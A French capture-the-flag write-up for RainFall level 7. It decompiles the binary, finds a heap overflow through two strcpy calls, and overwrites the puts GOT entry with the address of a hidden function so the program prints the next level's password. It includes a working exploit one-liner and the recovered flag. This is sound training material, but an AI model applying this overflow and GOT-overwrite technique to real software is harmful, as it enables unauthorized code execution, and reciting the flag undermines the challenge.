# Level 7

## Premierement, testons le programme

```bash
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 "B = better ascii"
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 "B = better ascii" "What about 'i' ?"
~~
```

On a donc un segfault si l'on met moins de deux arguments, regardons ce que ca donne dans ghidra

```c
undefined4 main(undefined4 param_1,int param_2)

{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;

  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
```

On peut voir 2 appels a `malloc`, 2 appels a `strcpy`(vulnerable au buffer overflow), et un appel a `fopen`, qui stock le `.pass` dans la variable `c`.
Et au niveau des fonctions dans gdb, on a ca:

```bash
(gdb) info functions
All defined functions:
Non-debugging symbols:
...
0x080484f4  m
...
```

Une fonction 'm' qui n'est pas appelée, regardons ce qu'elle fait:

```bash
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.
```

donc avec ghidra:

```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)

{
  time_t tVar1;

  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1);
  return;
}
```

Elle print donc la variable `c` et le temps actuel.

`strcpy` etant vulnerable au buffer overflow, nous pouvons essayer de remplacer l'adresse de puts dans la GOT par l'adresse de `m`, et ainsi appeler `m` pour afficher le `.pass`. Nous allons premierement avoir besoin de l'adresse de `m` et de `puts`, avec gdb

```bash
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   ...
End of assembler dump.
```

```bash
(gdb) x/i m
   0x80484f4 <m>:       push   %ebp
(gdb) x/i puts
   0x8048400 <puts@plt>:        jmp    *0x8049928
```

L'adresse de `m` est donc `0x80484f4` et celle de `puts` est `0x8049928`.
Il faut trouver combien de caractères il faut pour remplir le buffer

```bash
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEE 1
~~
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEEFFFF 1
Segmentation fault (core dumped)
```

On a donc besoin de 20 caractères pour remplir le buffer.

```python
./level7 $(python -c 'print "i=69"*5 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1693761628
```
